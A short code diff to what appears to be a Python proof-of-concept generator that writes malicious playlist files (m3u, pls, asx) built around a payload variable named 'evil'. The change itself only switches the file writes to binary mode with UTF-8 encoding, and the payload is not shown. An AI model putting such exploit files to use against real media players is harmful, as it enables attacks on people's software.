@@ -49,8 +49,8 @@ for e in ['m3u', 'pls', 'asx']:
     poc = "<asx version=\"3.0\"><entry><ref href=\"{}\"/></entry></asx>".format(evil)
   try:
     print("[*] Creating poc.%s file..." % e)
-    f = open('poc.%s' % e, 'w')
-    f.write(poc)
+    f = open('poc.%s' % e, 'wb')
+    f.write(poc.encode('utf-8'))
     f.close()
     print("[*] %s file successfully created!" % f.name)
   except:
